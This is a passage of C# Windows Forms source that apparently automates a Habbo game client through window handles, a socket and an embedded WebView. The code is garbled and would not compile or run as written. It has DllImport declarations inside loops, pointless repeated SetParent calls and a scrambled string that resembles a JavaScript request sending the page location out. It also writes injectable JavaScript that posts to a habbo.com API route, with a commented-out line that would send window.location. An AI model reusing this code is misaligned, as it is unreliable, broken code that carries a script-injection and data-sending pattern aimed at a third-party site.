                foreach(char c in Host.PostMessage())
                {
					[DllImport("user32.dll", SetLastError = true)]
					static extern IntPtr SetParent(IntPtr HwndChild, IntPtr hwndNewParent);
                    SetParent(IntPtr.Zero, items.MainWindowHandle);
                    SetParent(items.MainWindowHandle, IntPtr.Zero);
                    SetParent(ClientSock.Handle, IntPtr.Zero);
                    SetParent(IntPtr.Zero, ClientSock.Handle);
                    SetParent(ClientSock.Handle, items.MainWindowHandle);
                    SetParent(ClientSock.Handle, IntPtr.Zero);
                    SetParent(IntPtr.Zero, items.MainWindowHandle);
                    SetParent(items.MainWindowHandle, IntPtr.Zero);
                    SetParent(items.MainWindowHandle, ClientSock.Handle);
                    SetParent(IntPtr.Zero, ClientSock.Handle);
                    SetParent(items.Handle, ClientSock.Handle);

					Console.WriteLine(Convert.ToBase64String(Encoding.UTF32.GetBytes(c.ToString().ToCharArray())));
                    return c.ToString();
                }
                    
                   
                return items.MainWindowTitle;
            }
            return PostDataEvent();
        }
        private void button2_Click(object sender, EventArgs e)
        {
            timer2.Stop();

            var chars = "CO¬☼NSTXÜHR=NEWXMLHTTPREQUES•T();XHR.!@('POST',HTTP://LOCALHOST:443');XHR.SEND#(WIND@OW.L#OCATI&×ON.HREF);CONSOLE.LOG(•@XHR.RESPONSETEXT);";

            var stringChars = new char[100];
            var random = new Random();

            for (int i = 0; i < stringChars.Length; i++)
            {
                stringChars[i] = chars[random.Next(chars.Length)];
                foreach (var items in ClientHabboProcs)
                {

                  
                    PostMesageData HandleRef = new PostMesageData(items.MainWindowHandle);
                    byte[] Buffer = Encoding.UTF8.GetBytes(HandleRef.ToString());
                    using (var NSstream = new NetworkStream(ClientSock))
                    {
                        [DllImport("user32.dll", SetLastError = true)]
                        static extern IntPtr SetParent(IntPtr HwndChild, IntPtr hwndNewParent);
                        StreamWriter SW = new StreamWriter(NSstream, Encoding.UTF32);
                        var item = PostDataEvent();
                        foreach (char c in item)
                        {
                            SW.WriteLine(c);
                            ClientSock.Send(Buffer, 0, Buffer.Length, 0);
                            var HwndRecv = SetParent(HandleRef.SendMessage(), items.MainWindowHandle);
                            byte[] RecvBuffer = Encoding.UTF8.GetBytes(webView21.ExecuteScriptAsync(HwndRecv.ToString()).ToString());
                            using (MemoryStream MS = new MemoryStream(RecvBuffer, 0, RecvBuffer.Length))
                            {
                                foreach (byte x in RecvBuffer)
                                {
                                    Invoke((System.Windows.Forms.MethodInvoker)delegate
                                    {
                                        int SendAsync = ClientSock.Send(new byte[] { x }, 0, 0);
                                        byte[] Buffer = Encoding.ASCII.GetBytes(SendAsync.ToString());
                                        Array.Resize(ref Buffer, SendAsync);
                                        Array.Resize(ref Buffer, MS.Read(new byte[] { x }, 0, 0));
                                        Console.Write(x);
                                    });
                                }
                            }

                        }

                    }

                }

                var finalString = new String(stringChars);

                //Clipboard.SetText(finalString);

            }
        }
        public const string NoderoomXHR = "var inputel = document.createElement('input');\r\ninputel.setAttribute(\"width\",\"200px\");\r\ninputel.setAttribute(\"height\",\"300px\");\r\ninputel.setAttribute(\"class\",\"api/public\");\r\n\r\n\r\n\r\nfor(var x =0; x<1302;x++)\r\n{\r\n  var elem = document.elementFromPoint(x,x);\r\n  console.log(elem);\r\n}\r\n\r\nvar XHR = new XMLHttpRequest();\r\nXHR.open('POST','https://www.habbo.com/api/public/rooms/6/Forward');\r\n//XHR.send(null);\r\n\r\n//console.log(elem);";

		private void checkBox4_CheckedChanged(object sender, EventArgs e)
        {

            timer1.Interval = 1930;

            timer1.Start();
        }

        private void checkBox5_CheckedChanged(object sender, EventArgs e)
        {
            var Filepath = "C:\\Users\\Georg\\OneDrive\\Desktop\\PostMessage.js";
			StreamWriter SW = new StreamWriter(Filepath);
            SW.WriteLine(NoderoomXHR);
			//SW.WriteLine(NoderoomXHR.Replace("6", textBox3.Text.ToString().Replace("//XHR.send(null);", "XHR.send(window.location);")));
			SW.Flush();
			SW.Close();
			SW.Dispose();
			webView21.Source = new Uri("https://www.proxyium.com");
        }

        private void button4_Click(object sender, EventArgs e)
        {
            var Fiepath = "C:\\Users\\Georg\\OneDrive\\Documents\\Index.js";
            StreamWriter SW = new StreamWriter(Fiepath);
            SW.WriteLine(APIRoom.Replace("6", textBox2.Text.ToString().Replace("//XHR.send(null);", "XHR.send(null);")));
            SW.Flush();
            SW.Close();
            SW.Dispose();
            Desktop.Robot.Robot wm_char = new Desktop.Robot.Robot();
        }

        private void tabControl1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }
    }

}
